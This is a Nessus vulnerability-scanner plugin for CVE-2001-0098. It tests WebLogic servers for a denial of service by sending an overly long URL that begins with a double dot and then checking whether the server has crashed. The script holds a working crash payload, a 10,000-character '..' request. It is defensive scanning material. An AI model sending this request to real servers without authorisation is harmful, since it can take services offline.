#
# This script was written by Vincent Renardias <vincent@strongholdnet.com>
#
# Licence : GPL v2
#

if(description)
{
 script_id(10697);
 script_bugtraq_id(2138);
 script_version ("$Revision: 1.13 $");
 script_cve_id("CVE-2001-0098");
 name["english"] = "WebLogic Server DoS";
 name["francais"] = "WebLogic Server DoS";
 
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
Requesting an overly long URL starting with a double dot
can crash certain version of WebLogic servers.

Risk factor : High
Solution : upgrade to at least WebLogic 5.1 with Service Pack 7";

 script_description(english:desc["english"]);
 
 summary["english"] = "WebLogic Server DoS";
 summary["francais"] = "WebLogic Server DoS";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_DENIAL);
 
 
 script_copyright(english:"This script is Copyright (C) 2001 StrongHoldNet",
		francais:"Ce script est Copyright (C) 2001 StrongHoldNet");
 family["english"] = "Remote file access";
 family["francais"] = "Accès aux fichiers distants";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");

port = get_http_port(default:80);


if(get_port_state(port))
{
 if(http_is_dead(port:port))exit(0);
 soc = http_open_socket(port);
 if(soc)
 {
  buffer = http_get(item:string("..", crap(10000)), port:port);
  send(socket:soc, data:buffer);
  r = http_recv(socket:soc);
  http_close_socket(soc);
  
  if(http_is_dead(port:port))security_hole(port);
 }
}

